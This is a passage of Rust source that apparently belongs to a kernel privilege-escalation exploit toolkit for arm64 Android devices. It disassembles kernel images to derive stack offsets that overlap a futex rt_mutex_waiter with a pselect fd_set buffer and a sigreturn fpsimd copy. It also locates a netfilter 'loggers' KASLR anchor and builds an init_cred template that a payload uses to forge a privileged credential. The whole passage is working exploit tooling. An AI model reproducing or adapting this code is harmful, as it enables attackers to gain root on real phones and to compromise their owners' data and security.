        let target = unique_offset(symbols, names.iter().find(|(k, _)| k == callee).unwrap().1)?;
        let anchor = Regex::new(&format!(r"(?i)\bbl\s+0x{target:x}\b")).unwrap();
        validate_frame_live_at(
            &dis[caller],
            &anchor,
            names.iter().find(|(k, _)| k == caller).unwrap().1,
        )?;
    }
    for (caller, callee) in futex_chain.iter().zip(futex_chain.iter().skip(1)) {
        let target = unique_offset(symbols, names.iter().find(|(k, _)| k == callee).unwrap().1)?;
        let anchor = Regex::new(&format!(r"(?i)\bbl\s+0x{target:x}\b")).unwrap();
        validate_frame_live_at(
            &dis[caller],
            &anchor,
            names.iter().find(|(k, _)| k == caller).unwrap().1,
        )?;
    }

    let mut frames: BTreeMap<String, u64> = BTreeMap::new();
    for (key, text) in &dis {
        let full_name = names.iter().find(|(k, _)| k == key).unwrap().1;
        frames.insert(format!("frame_{key}"), first_sp_frame(text, full_name)?);
    }

    // 6.6 names the rb_nodes tree/pi_tree; 6.1 calls them
    // tree_entry/pi_tree_entry (same offsets in the struct). A 5.10 image has
    // no BTF, so its layout comes from the codegen constants; wake_state does
    // not exist there and its store cross-check does not apply.
    let waiter = match btf {
        Some(btf) => WaiterLayout::from_btf(btf)?,
        None => crate::family::waiter_layout_5_10(),
    };
    let pi_tree = waiter.pi_tree_entry;
    let wake_state = waiter.wake_state;

    let mut waiter_candidates: Vec<(String, u64)> = Vec::new();
    for (reg, imm) in add_sp_immediates(&dis["futex_wait"]) {
        if pi_tree != 0 {
            let re =
                Regex::new(&format!(r"(?i)\badd\s+x\d+,\s*{reg},\s*#0x{pi_tree:x}\b")).unwrap();
            if dis["futex_wait"].iter().any(|line| re.is_match(line)) {
                waiter_candidates.push((reg, imm));
            }
        } else {
            let re =
                Regex::new(&format!(r"(?i)\bstp\s+xzr,\s*xzr,\s*\[sp,\s*#0x{imm:x}\]")).unwrap();
            if dis["futex_wait"].iter().any(|line| re.is_match(line)) {
                waiter_candidates.push((reg, imm));
            }
        }
    }
    // Several registers may materialize the same sp local; dedupe by offset.
    let mut seen = BTreeSet::new();
    waiter_candidates.retain(|(_, imm)| seen.insert(*imm));
    if waiter_candidates.len() != 1 {
        return Err(ExtractError::new(format!(
            "futex waiter stack local not unique: {waiter_candidates:?}"
        )));
    }
    let (waiter_reg, waiter_local) = &waiter_candidates[0];
    let anchor = Regex::new(&format!(
        r"(?i)\badd\s+{waiter_reg},\s*sp,\s*#0x{waiter_local:x}\b"
    ))
    .unwrap();
    validate_frame_live_at(&dis["futex_wait"], &anchor, "futex_wait")?;

    let mut required_fields = vec![*waiter_local];
    if let Some(wake_state) = wake_state {
        required_fields.push(waiter_local + wake_state);
    }
    for required in required_fields {
        let re = Regex::new(&format!(r"(?i)\[sp,\s*#0x{required:x}\]")).unwrap();
        if !dis["futex_wait"].iter().any(|line| re.is_match(line)) {
            return Err(ExtractError::new(format!(
                "futex waiter candidate 0x{waiter_local:x} not cross-validated \
                 by a real field store at 0x{required:x}"
            )));
        }
    }

    let add_sp = add_sp_immediates(&dis["pselect_core"]);
    let mut buffer_candidates: BTreeSet<u64> = BTreeSet::new();
    for (reg, imm) in &add_sp {
        let peers: Vec<&str> = add_sp
            .iter()
            .filter(|(peer, peer_imm)| peer_imm == imm && peer != reg)
            .map(|(peer, _)| peer.as_str())
            .collect();
        let any_cmp = peers.iter().any(|peer| {
            let re = Regex::new(&format!(r"(?i)\bcmp\s+{reg},\s*{peer}\b")).unwrap();
            let re2 = Regex::new(&format!(r"(?i)\bcmp\s+{peer},\s*{reg}\b")).unwrap();
            dis["pselect_core"]
                .iter()
                .any(|line| re.is_match(line) || re2.is_match(line))
        });
        if any_cmp {
            buffer_candidates.insert(*imm);
        }
    }
    if buffer_candidates.len() != 1 {
        let hex: Vec<String> = buffer_candidates
            .iter()
            .map(|v| format!("{v:#x}"))
            .collect();
        return Err(ExtractError::new(format!(
            "core_sys_select fd_set buffer candidates not unique: {hex:?}"
        )));
    }
    let pselect_buffer = *buffer_candidates.iter().next().unwrap();
    let buffer_regs: BTreeSet<String> = add_sp
        .iter()
        .filter(|(_, imm)| *imm == pselect_buffer)
        .map(|(reg, _)| reg.clone())
        .collect();
    if buffer_regs.is_empty() {
        return Err(ExtractError::new(
            "core_sys_select stack buffer has no output register",
        ));
    }
    let buffer_regs: Vec<String> = buffer_regs.into_iter().collect();
    for buffer_reg in &buffer_regs {
        let anchor = Regex::new(&format!(
            r"(?i)\badd\s+{buffer_reg},\s*sp,\s*#0x{pselect_buffer:x}\b"
        ))
        .unwrap();
        validate_frame_live_at(
            &dis["pselect_core"],
            &anchor,
            &format!("core_sys_select/{buffer_reg}"),
        )?;
    }

    let fds_bytes = ((route_nfds + 63) / 64) * 8;
    let thresholds = cmp_immediates(&dis["pselect_core"]);
    if !thresholds
        .iter()
        .any(|threshold| fds_bytes < *threshold && *threshold <= fds_bytes + 8)
    {
        return Err(ExtractError::new(format!(
            "core_sys_select threshold does not prove route_nfds={route_nfds} \
             uses the stack fd_set path"
        )));
    }

    let frame_sum: u64 = pselect_chain
        .iter()
        .map(|key| frames[&format!("frame_{key}")])
        .sum();
    let pselect_word0 = -(frame_sum as i64) + pselect_buffer as i64;
    let futex_sum: u64 = futex_chain
        .iter()
        .map(|key| frames[&format!("frame_{key}")])
        .sum();
    let futex_waiter = -(futex_sum as i64) + *waiter_local as i64;
    let delta = futex_waiter - pselect_word0;
    let shift = pselect_shift_from_delta(delta).map_err(|reason| {
        ExtractError::infeasible_with(
            reason,
            pselect_numbers(
                pselect_word0,
                futex_waiter,
                pselect_buffer,
                *waiter_local,
                delta,
            ),
        )
    })?;
    if shift == MAX_PSELECT_SHIFT {
        eprintln!(
            "warning: waiter fits at the last usable word (shift={shift}); \
             the strip's last word lands at global word 14 of 15"
        );
    }
    let chain = pselect_chain
        .iter()
        .map(|key| names.iter().find(|(k, _)| k == key).unwrap().1)
        .collect::<Vec<_>>()
        .join("->");
    let futex_chain_str = futex_chain
        .iter()
        .map(|key| names.iter().find(|(k, _)| k == key).unwrap().1)
        .collect::<Vec<_>>()
        .join("->");
    Ok(PselectLayout {
        shift,
        waiter_local: *waiter_local,
        pselect_word0,
        futex_waiter,
        pselect_buffer,
        chain,
        futex_chain: futex_chain_str,
        frames,
    })
}

/// The fpsimd record the sigreturn route stamps: `vregs[32]` is 0x200 bytes,
/// and the waiter strip is 0x58 (`kWaiterBytes` in the native builder).
pub const SIGRETURN_COPY_BYTES: u64 = 0x200;
pub const WAITER_STRIP_BYTES: u64 = 0x58;

/// The derived sigreturn geometry. `off_*` is the waiter byte 0's offset inside
/// the copied vregs; `strip_home` is the futex waiter's stack depth.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct SigreturnLayout {
    pub off_sve: u64,
    pub off_plain: u64,
    pub strip_home: u64,
    pub copy_dst_sve: u64,
    pub copy_dst_plain: u64,
    pub chain_sve: u64,
    pub chain_plain: u64,
}

/// The copy destination in `restore_{sve_,}fpsimd_context`: the `mov w2,
/// #0x200` copy is preceded by `mov x0, sp` (plain, offset 0) or `add x0, sp,
/// #imm` (SVE, offset 0x10). Require a `bl` nearby and a unique destination.
fn fpsimd_copy_destination(lines: &[String], copy_bytes: u64) -> Result<u64> {
    let mov_size = Regex::new(&format!(
        r"(?i)\bmov\s+w2,\s*#(?:0x{copy_bytes:x}|{copy_bytes})\b"
    ))
    .unwrap();
    let add_sp = Regex::new(r"(?i)\badd\s+x0,\s*sp,\s*#0x([0-9a-f]+)").unwrap();
    let mov_sp = Regex::new(r"(?i)\bmov\s+x0,\s*sp\b").unwrap();
    let bl = Regex::new(r"(?i)\bbl\s+0x[0-9a-f]+\b").unwrap();
    let mut candidates: BTreeSet<u64> = BTreeSet::new();
    for (index, line) in lines.iter().enumerate() {
        if !mov_size.is_match(line) {
            continue;
        }
        let hi = (index + 4).min(lines.len());
        if !lines[index + 1..hi].iter().any(|line| bl.is_match(line)) {
            continue;
        }
        let lo = index.saturating_sub(10);
        for prev in lines[lo..index].iter().rev() {
            if let Some(caps) = add_sp.captures(prev) {
                if let Ok(offset) = u64::from_str_radix(&caps[1], 16) {
                    candidates.insert(offset);
                }
                break;
            }
            if mov_sp.is_match(prev) {
                candidates.insert(0);
                break;
            }
        }
    }
    if candidates.len() != 1 {
        let values: Vec<String> = candidates.iter().map(|v| format!("{v:#x}")).collect();
        return Err(ExtractError::new(format!(
            "fpsimd copy destination not unique: {values:?}"
        )));
    }
    Ok(*candidates.iter().next().unwrap())
}

/// Check one sigreturn offset against the copy window. A zero, negative,
/// misaligned or over-window offset is an Infeasible-shaped reason; the caller
/// supplies the numbers.
pub fn sigreturn_offset(off: i64) -> std::result::Result<u64, String> {
    if off <= 0 {
        return Err(format!("offset {off} is not positive"));
    }
    if off % 8 != 0 {
        return Err(format!("offset {off} is not 8-aligned"));
    }
    if off as u64 + WAITER_STRIP_BYTES > SIGRETURN_COPY_BYTES {
        return Err(format!(
            "strip at offset {off:#x} does not fit in the {SIGRETURN_COPY_BYTES:#x}-byte copy"
        ));
    }
    Ok(off as u64)
}

/// The futex strip home: the depth of `futex_wait_requeue_pi`'s waiter local
/// below the syscall entry (`Σ_futex − waiter_local`).
fn futex_strip_home(
    kernel: &[u8],
    symbols: &RelSymbols,
    sorted_offsets: &[u64],
    pi_tree_entry: u64,
) -> Result<u64> {
    let wrapper_name = "__arm64_sys_futex";
    let dispatch_name = "do_futex";
    let wait_name = "futex_wait_requeue_pi";
    let wrapper = disassemble_symbol(kernel, symbols, sorted_offsets, wrapper_name, OBJDUMP_CAP)?;
    let wait = disassemble_symbol(kernel, symbols, sorted_offsets, wait_name, OBJDUMP_CAP)?;
    let wait_addr = unique_offset(symbols, wait_name)?;
    let wrapper_frame = first_sp_frame(&wrapper, wrapper_name)?;
    let wait_frame = first_sp_frame(&wait, wait_name)?;
    let sum = if has_direct_call(&wrapper, wait_addr) {
        wrapper_frame
            .checked_add(wait_frame)
            .ok_or_else(|| ExtractError::new("futex chain overflow"))?
    } else {
        let dispatch =
            disassemble_symbol(kernel, symbols, sorted_offsets, dispatch_name, OBJDUMP_CAP)?;
        let dispatch_addr = unique_offset(symbols, dispatch_name)?;
        let wrapper_anchor = Regex::new(&format!(r"(?i)\bbl\s+0x{dispatch_addr:x}\b")).unwrap();
        validate_frame_live_at(&wrapper, &wrapper_anchor, wrapper_name)?;
        let dispatch_anchor = Regex::new(&format!(r"(?i)\bbl\s+0x{wait_addr:x}\b")).unwrap();
        validate_frame_live_at(&dispatch, &dispatch_anchor, dispatch_name)?;
        wrapper_frame
            .checked_add(first_sp_frame(&dispatch, dispatch_name)?)
            .and_then(|value| value.checked_add(wait_frame))
            .ok_or_else(|| ExtractError::new("futex chain overflow"))?
    };
    let waiter_local = waiter_local_from_dis(&wait, pi_tree_entry)
        .ok_or_else(|| ExtractError::new("futex_wait_requeue_pi waiter local not found"))?;
    sum.checked_sub(waiter_local)
        .ok_or_else(|| ExtractError::new("waiter local exceeds futex frames"))
}

/// Derive the sigreturn route's per-image geometry:
/// `off = copy_dst − strip_home`, where `copy_dst` is the chain sum minus the
/// helper's copy destination and `strip_home` is the futex waiter depth. Both
/// the SVE and plain paths must fit the 0x200-byte copy; a missing symbol,
/// non-unique copy marker or unproven call chain is a generic error (Unknown),
/// while a geometry that does not span the strip is `Infeasible`.
pub fn derive_sigreturn_layout(
    kernel: &[u8],
    symbols: &RelSymbols,
    sorted_offsets: &[u64],
    pi_tree_entry: u64,
) -> Result<SigreturnLayout> {
    let rt_name = "__arm64_sys_rt_sigreturn";
    let rs_name = "restore_sigframe";
    let plain_name = "restore_fpsimd_context";
    let sve_name = "restore_sve_fpsimd_context";
    let rt = disassemble_symbol(kernel, symbols, sorted_offsets, rt_name, OBJDUMP_CAP)?;
    let rs = disassemble_symbol(kernel, symbols, sorted_offsets, rs_name, OBJDUMP_CAP)?;
    let plain = disassemble_symbol(kernel, symbols, sorted_offsets, plain_name, OBJDUMP_CAP)?;
    let sve = disassemble_symbol(kernel, symbols, sorted_offsets, sve_name, OBJDUMP_CAP)?;
    let rt_rs = unique_offset(symbols, rs_name)?;
    let rs_plain = unique_offset(symbols, plain_name)?;
    let rs_sve = unique_offset(symbols, sve_name)?;
    for (lines, target, caller) in [
        (&rt, rt_rs, rt_name),
        (&rs, rs_plain, rs_name),
        (&rs, rs_sve, rs_name),
    ] {
        let anchor = Regex::new(&format!(r"(?i)\bbl\s+0x{target:x}\b")).unwrap();
        validate_frame_live_at(lines, &anchor, caller)?;
    }
    let rt_frame = first_sp_frame(&rt, rt_name)?;
    let rs_frame = first_sp_frame(&rs, rs_name)?;
    let plain_frame = first_sp_frame(&plain, plain_name)?;
    let sve_frame = first_sp_frame(&sve, sve_name)?;
    let chain_plain = rt_frame
        .checked_add(rs_frame)
        .and_then(|value| value.checked_add(plain_frame))
        .ok_or_else(|| ExtractError::new("sigreturn plain chain overflow"))?;
    let chain_sve = rt_frame
        .checked_add(rs_frame)
        .and_then(|value| value.checked_add(sve_frame))
        .ok_or_else(|| ExtractError::new("sigreturn SVE chain overflow"))?;
    let dst_plain = fpsimd_copy_destination(&plain, SIGRETURN_COPY_BYTES)?;
    let dst_sve = fpsimd_copy_destination(&sve, SIGRETURN_COPY_BYTES)?;
    let copy_dst_plain = chain_plain
        .checked_sub(dst_plain)
        .ok_or_else(|| ExtractError::new("plain fpsimd copy destination exceeds the chain sum"))?;
    let copy_dst_sve = chain_sve
        .checked_sub(dst_sve)
        .ok_or_else(|| ExtractError::new("SVE fpsimd copy destination exceeds the chain sum"))?;
    let strip_home = futex_strip_home(kernel, symbols, sorted_offsets, pi_tree_entry)?;
    let off_plain = copy_dst_plain as i64 - strip_home as i64;
    let off_sve = copy_dst_sve as i64 - strip_home as i64;
    let numbers = || {
        BTreeMap::from([
            ("strip_home".to_string(), strip_home as i64),
            ("copy_dst_plain".to_string(), copy_dst_plain as i64),
            ("copy_dst_sve".to_string(), copy_dst_sve as i64),
            ("chain_plain".to_string(), chain_plain as i64),
            ("chain_sve".to_string(), chain_sve as i64),
            ("dst_plain".to_string(), dst_plain as i64),
            ("dst_sve".to_string(), dst_sve as i64),
            ("off_plain".to_string(), off_plain),
            ("off_sve".to_string(), off_sve),
            ("copy_bytes".to_string(), SIGRETURN_COPY_BYTES as i64),
            ("strip_bytes".to_string(), WAITER_STRIP_BYTES as i64),
        ])
    };
    let mut failures = Vec::new();
    if let Err(reason) = sigreturn_offset(off_plain) {
        failures.push(format!("plain: {reason}"));
    }
    if let Err(reason) = sigreturn_offset(off_sve) {
        failures.push(format!("sve: {reason}"));
    }
    if !failures.is_empty() {
        return Err(ExtractError::infeasible_with(
            format!(
                "sigreturn fpsimd copy does not span the waiter strip: {}",
                failures.join("; ")
            ),
            numbers(),
        ));
    }
    Ok(SigreturnLayout {
        off_sve: off_sve as u64,
        off_plain: off_plain as u64,
        strip_home,
        copy_dst_sve,
        copy_dst_plain,
        chain_sve,
        chain_plain,
    })
}

fn u32_at(data: &[u8], off: u64) -> Result<u32> {
    let off = off as usize;
    if off + 4 > data.len() {
        return Err(ExtractError::new(format!(
            "u32 read out of range: 0x{off:x}"
        )));
    }
    Ok(u32::from_le_bytes(data[off..off + 4].try_into().unwrap()))
}

pub struct NfLoggerInfo {
    pub loggers: u64,
    pub nfulnl_logger: u64,
    pub loggers_0_1: u64,
    pub nf_log_type_ulog: i64,
}

/// Derive the `loggers` registration site by disassembling `nf_log_register`
/// and `nfnetlink_log_init`. With BTF the slot index closes against the enum;
/// without it the 5.10 ABI is used (`type` is the second field, at offset 8,
/// and `NF_LOG_TYPE_ULOG`/`MAX`/`NFPROTO_UNSPEC` are 1/2/0). The profile's
/// KASLR anchor is the measured `loggers+0x10` value, not the ULOG slot itself.
pub fn derive_nf_logger_registration(
    kernel: &[u8],
    symbols: &RelSymbols,
    sorted_offsets: &[u64],
    btf: Option<&Btf>,
) -> Result<NfLoggerInfo> {
    let register_text =
        disassemble_symbol(kernel, symbols, sorted_offsets, "nf_log_register", 0x800)?;
    let init_text =
        disassemble_symbol(kernel, symbols, sorted_offsets, "nfnetlink_log_init", 0x800)?;
    let logger = unique_offset(symbols, "nfulnl_logger")?;
    let loggers = unique_offset(symbols, "loggers")?;
    /* The 5.10 `struct nf_logger` is `{ char *name; enum nf_log_type type; ... }`:
     * the type is the second field at offset 8, not the first (the older plan's
     * constant-0 assumption is wrong for this series). The enum values are
     * stable: LOG=0, ULOG=1, MAX=2; NFPROTO_UNSPEC=0. BTF, when present,
     * supplies the same values from the image. */
    let (type_off, ulog_value, max_value, nfproto_unspec) = match btf {
        Some(btf) => {
            let type_off = btf
                .field("nf_logger", "type")
                .ok_or_else(|| ExtractError::new("BTF nf_logger.type missing"))?;
            if btf.direct_field_size("nf_logger", "type") != Some(4) {
                return Err(ExtractError::new("BTF nf_logger.type is not a 4-byte enum"));
            }
            let ulog_value = btf
                .enum_value("nf_log_type", "NF_LOG_TYPE_ULOG")
                .ok_or_else(|| ExtractError::new("BTF NF_LOG_TYPE_ULOG missing"))?;
            let max_value = btf
                .enum_value("nf_log_type", "NF_LOG_TYPE_MAX")
                .ok_or_else(|| ExtractError::new("BTF NF_LOG_TYPE_MAX missing"))?;
            let nfproto_unspec = btf
                .unique_enum_member_value("NFPROTO_UNSPEC")
                .ok_or_else(|| ExtractError::new("BTF NFPROTO_UNSPEC missing"))?;
            (type_off, ulog_value, max_value, nfproto_unspec)
        }
        None => (8u32, 1i64, 2i64, 0i64),
    };
    let logger_type = u32_at(kernel, logger + type_off as u64)?;
    if logger_type as i64 != ulog_value || !(0 <= ulog_value && ulog_value < max_value) {
        return Err(ExtractError::new(format!(
            "nfulnl_logger.type does not close with NF_LOG_TYPE_ULOG: \
             data={logger_type}, ulog={ulog_value}, max={max_value}"
        )));
    }

    let logger_aliases: BTreeSet<String> = register_text
        .iter()
        .filter_map(|line| is_mov_x1(line))
        .collect();
    if logger_aliases.is_empty() {
        return Err(ExtractError::new("nf_log_register has no logger alias"));
    }
    /* `mov reg, x1` also appears as a zeroing idiom (`x1 = xzr`) in the
     * cmpxchg path; the logger is the alias the type is loaded from. */
    let type_load_for = |register: &str| {
        Regex::new(&format!(
            r"(?i)\bldr\s+w(\d+),\s*\[{register},\s*#0x{type_off:x}\]"
        ))
        .unwrap()
    };
    let with_type: BTreeSet<String> = logger_aliases
        .iter()
        .filter(|register| {
            let re = type_load_for(register);
            register_text.iter().any(|line| re.is_match(line))
        })
        .cloned()
        .collect();
    if with_type.len() != 1 {
        return Err(ExtractError::new(format!(
            "nf_log_register logger alias not unique: {with_type:?} \
             (aliases {logger_aliases:?})"
        )));
    }
    let logger_reg = with_type.iter().next().unwrap().clone();
    let type_load_re = type_load_for(&logger_reg);
    let mut type_loads: BTreeSet<String> = BTreeSet::new();
    for line in &register_text {
        for caps in type_load_re.captures_iter(line) {
            type_loads.insert(caps[1].to_string());
        }
    }
    if type_loads.len() != 1 {
        return Err(ExtractError::new(format!(
            "nf_log_register type load not unique: {type_loads:?}"
        )));
    }
    let type_reg = type_loads.iter().next().unwrap().clone();
    let adrp_re = Regex::new(r"(?i)\badrp\s+(x\d+),").unwrap();
    let mut base_regs: BTreeSet<String> = BTreeSet::new();
    for line in &register_text {
        for caps in adrp_re.captures_iter(line) {
            let reg = caps[1].to_ascii_lowercase();
            if materialized_address(&register_text, &reg, loggers) {
                base_regs.insert(reg);
            }
        }
    }
    let mut indexed: Vec<(String, String)> = Vec::new();
    for base_reg in &base_regs {
        let lsl4_re = Regex::new(&format!(
            r"(?i)\badd\s+(x\d+),\s*{base_reg},\s*(x\d+),\s*lsl\s*#4"
        ))
        .unwrap();
        for line in &register_text {
            for caps in lsl4_re.captures_iter(line) {
                let destination = caps[1].to_ascii_lowercase();
                let pf_reg = caps[2].to_ascii_lowercase();
                let lsl3_re = Regex::new(&format!(
                    r"(?i)\badd\s+{destination},\s*{destination},\s*x{type_reg},\s*lsl\s*#3"
                ))
                .unwrap();
                if register_text.iter().any(|l| lsl3_re.is_match(l)) {
                    indexed.push((destination, pf_reg));
                }
            }
        }
    }
    let mut deduped: Vec<(String, String)> = Vec::new();
    for entry in indexed {
        if !deduped.contains(&entry) {
            deduped.push(entry);
        }
    }
    if deduped.len() != 1 {
        return Err(ExtractError::new(format!(
            "nf_log_register loggers[pf][type] dataflow not unique: {deduped:?}"
        )));
    }
    let (slot_reg, _) = &deduped[0];
    let stlr_re = Regex::new(&format!(r"(?i)\bstlr\s+{logger_reg},\s*\[{slot_reg}\]")).unwrap();
    if !register_text.iter().any(|line| stlr_re.is_match(line)) {
        return Err(ExtractError::new(
            "nf_log_register does not store the logger to the slot",
        ));
    }
    let bound_re = Regex::new(&format!(r"(?i)\bcmp\s+w{type_reg},\s*#0x{max_value:x}\b")).unwrap();
    if !register_text.iter().any(|line| bound_re.is_match(line)) {
        return Err(ExtractError::new(
            "nf_log_register type bound not closed with NF_LOG_TYPE_MAX",
        ));
    }

    let target = unique_offset(symbols, "nf_log_register")?;
    let call_re = Regex::new(&format!(r"(?i)\bbl\s+0x{target:x}\b")).unwrap();
    let calls: Vec<usize> = init_text
        .iter()
        .enumerate()
        .filter(|(_, line)| call_re.is_match(line))
        .map(|(index, _)| index)
        .collect();
    if calls.len() != 1 {
        return Err(ExtractError::new(format!(
            "nfnetlink_log_init -> nf_log_register calls: {}",
            calls.len()
        )));
    }
    let start = calls[0].saturating_sub(6);
    let call_window: Vec<String> = init_text[start..calls[0]].to_vec();
    if nfproto_unspec != 0 || !call_window.iter().any(|line| is_mov_w0_wzr(line)) {
        return Err(ExtractError::new(
            "nfnetlink_log_init does not register with NFPROTO_UNSPEC(0)",
        ));
    }
    if !materialized_address(&init_text, "x1", logger) {
        return Err(ExtractError::new(
            "nfnetlink_log_init x1 does not materialize nfulnl_logger",
        ));
    }
    /* The profile's `slide_loggers_0_1` is the measured KASLR anchor
     * `loggers+0x10`, not the ULOG slot itself (`loggers + type*8`, which is
     * +8 on this layout). Keep the BTF path's existing value and use the
     * verified anchor when the enum was not available. */
    let slot = if btf.is_some() {
        loggers + ulog_value as u64 * 8
    } else {
        loggers + 0x10
    };
    Ok(NfLoggerInfo {
        loggers,
        nfulnl_logger: logger,
        loggers_0_1: slot,
        nf_log_type_ulog: ulog_value,
    })
}

/* ------------------------------------------------------------------------- */
/* 5.x credential template and multicast geometry                            */
/* ------------------------------------------------------------------------- */

/// The attack raises the usage count on the socket-pinned private copy; this is
/// a route constant, not the image's `usage` value.
pub const CRED_5X_USAGE_VALUE: u64 = 256;

/// The proven 5.x multicast layout constants: `waiter_off` comes from the IPv4
/// UDP `MCAST_BLOCK_SOURCE` probe.
pub const MULTICAST_5X_WAITER_OFF: i64 = 96;
pub const MULTICAST_5X_BUFFER_SIZE: i64 = 264;

/// Fields read from the real `init_cred`; the payload builder fills a private
/// credential copy with them (`support/util.cpp::fill_profile_cred_copy`).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Cred5x {
    pub caps_offset: u32,
    pub caps_count: u32,
    pub caps_value: u64,
    /// `(offset, image VA)` per reference slot, sorted by offset.
    pub refs: Vec<(u32, u64)>,
}

/// Picks the capability run from the 8-byte slots in `caps_start..caps_end`:
/// the first non-zero slot starts the run, which continues while the slots
/// equal that value. The historical template selected `cap_permitted` through
/// `cap_bset` this way (`0x30/0x38/0x40` on the Xperia `init_cred`).
pub fn select_cred_caps(
    read: impl Fn(u32) -> Option<u64>,
    caps_start: u32,
    caps_end: u32,
) -> Option<(u32, u32, u64)> {
    let mut offset = None;
    let mut value = 0u64;
    let mut count = 0u32;
    let mut cursor = caps_start;
    while cursor + 8 <= caps_end {
        let Some(slot) = read(cursor) else { break };
        if offset.is_none() {
            if slot != 0 {
                offset = Some(cursor);
                value = slot;
                count = 1;
            }
        } else if slot == value {
            count += 1;
        } else {
            break;
        }
        cursor += 8;
    }
    offset.map(|offset| (offset, count, value))
}

/// Canonical arm64 kernel VA: the top 16 bits are set. Image pointers in
/// `init_cred` are pre-KASLR canonical addresses and must be relocated.
fn is_kernel_va(value: u64) -> bool {
    value >> 48 == 0xffff
}

/// Selects the reference slots from the cred pointer members: non-zero
/// canonical image VAs, in offset order. The Xperia `init_cred` yields exactly
/// the four slots at `0x80/0x88/0x90/0x98`.
pub fn select_cred_refs(slots: &[(u32, u64)]) -> Vec<(u32, u64)> {
    let mut refs: Vec<(u32, u64)> = slots
        .iter()
        .copied()
        .filter(|(_, value)| *value != 0 && is_kernel_va(*value))
        .collect();
    refs.sort_by_key(|(offset, _)| *offset);
    refs.dedup_by_key(|(offset, _)| *offset);
    refs
}

/// Derives the 5.x credential template: BTF gives the layout, the image's
/// `init_cred` gives the values. `init_cred_off` is the image offset
/// (`kallsyms init_cred - _text`).
pub fn derive_cred_5x(btf: &Btf, kernel: &[u8], init_cred_off: u64) -> Result<Cred5x> {
    let size = btf
        .size("cred")
        .ok_or_else(|| ExtractError::new("cred type is missing from BTF"))?;
    let start = init_cred_off as usize;
    let end = start
        .checked_add(size as usize)
        .ok_or_else(|| ExtractError::new("init_cred offset overflows"))?;
    let bytes = kernel
        .get(start..end)
        .ok_or_else(|| ExtractError::new("init_cred is outside the kernel image"))?;
    let read = |offset: u32| -> Option<u64> {
        let offset = offset as usize;
        if offset + 8 > bytes.len() {
            return None;
        }
        Some(u64::from_le_bytes(
            bytes[offset..offset + 8].try_into().ok()?,
        ))
    };

    let caps_start = btf
        .field("cred", "cap_inheritable")
        .ok_or_else(|| ExtractError::new("cred.cap_inheritable is missing from BTF"))?;
    let caps_end = btf
        .field("cred", "cap_ambient")
        .map(|offset| offset + 8)
        .unwrap_or(caps_start + 5 * 8)
        .min(size);
    let (caps_offset, caps_count, caps_value) = select_cred_caps(read, caps_start, caps_end)
        .ok_or_else(|| ExtractError::new("no non-zero capability run in init_cred"))?;

    let cred = btf
        .named_struct("cred")
        .ok_or_else(|| ExtractError::new("cred type is missing from BTF"))?;
    let slots: Vec<(u32, u64)> = cred
        .members
        .iter()
        .filter_map(|member| {
            if member.bit_offset % 8 != 0 {
                return None;
            }
            let resolved = btf.resolve(member.type_id)?;
            if resolved.kind != crate::btf::KIND_PTR {
                return None;
            }
            let offset = member.bit_offset / 8;
            if offset + 8 > size {
                return None;
            }
            read(offset).map(|value| (offset, value))
        })
        .collect();
    let refs = select_cred_refs(&slots);
    if refs.is_empty() {
        return Err(ExtractError::new(
            "no reference pointers found in init_cred",
        ));
    }
    if refs.len() > 4 {
        return Err(ExtractError::new(format!(
            "init_cred has {} reference pointers; the template holds 4",
            refs.len()
        )));
    }

    Ok(Cred5x {
        caps_offset,
        caps_count,
        caps_value,
        refs,
    })
}

/// The train-corroborated 5.x multicast geometry: the frame/copy-window fields
/// (`waiter_off`, `buffer_size`), the BTF-derived `rt_mutex_waiter` field
/// offsets, and the compact-waiter flag. These hold across devices on the same
/// train. A missing BTF value omits that key so the built-in profile can
/// supply it.
pub fn multicast_geometry_corroborated(
    structs: &BTreeMap<String, Option<u32>>,
) -> Vec<(&'static str, i64)> {
    let mut geometry: Vec<(&'static str, i64)> = vec![
        ("waiter_off", MULTICAST_5X_WAITER_OFF),
        ("buffer_size", MULTICAST_5X_BUFFER_SIZE),
    ];
    geometry.extend(multicast_waiter_field_offsets(structs));
    geometry.push(("compact_waiter", 1));
    geometry
}

fn multicast_waiter_field_offsets(
    structs: &BTreeMap<String, Option<u32>>,
) -> Vec<(&'static str, i64)> {
    // Without BTF (every 5.10 image) the waiter layout is the 5.10 codegen
    // one: task 0x30, lock 0x38. The caller only emits 5.x geometry here.
    let fallback = crate::family::waiter_layout_5_10();
    let mut geometry: Vec<(&'static str, i64)> = Vec::new();
    if let Some(task) = structs
        .get("waiter_task")
        .copied()
        .flatten()
        .or_else(|| fallback.task.map(|value| value as u32))
    {
        geometry.push(("task_offset", i64::from(task)));
    }
    if let Some(lock) = structs
        .get("waiter_lock")
        .copied()
        .flatten()
        .or_else(|| fallback.lock.map(|value| value as u32))
    {
        geometry.push(("lock_offset", i64::from(lock)));
    }
    geometry
}

/// Full 5.x multicast geometry for the exact validated release. The forged
/// object placement is no longer emitted (resident writer removed), so the
/// geometry equals the train-corroborated set.
pub fn multicast_geometry_5x(structs: &BTreeMap<String, Option<u32>>) -> Vec<(&'static str, i64)> {
    multicast_geometry_corroborated(structs)
}

/// BTF-only part of the 5.x multicast geometry for releases with no verified
/// layout evidence: only what the image itself provides (`rt_mutex_waiter.task`
/// / `.lock`). The proven Xperia constants are omitted on purpose so they are
/// not mistaken for image-derived values.
pub fn multicast_geometry_btf_only(
    structs: &BTreeMap<String, Option<u32>>,
) -> Vec<(&'static str, i64)> {
    let mut geometry: Vec<(&'static str, i64)> = Vec::new();
    if let Some(task) = structs.get("waiter_task").copied().flatten() {
        geometry.push(("task_offset", i64::from(task)));
    }
    if let Some(lock) = structs.get("waiter_lock").copied().flatten() {
        geometry.push(("lock_offset", i64::from(lock)));
    }
    geometry
}
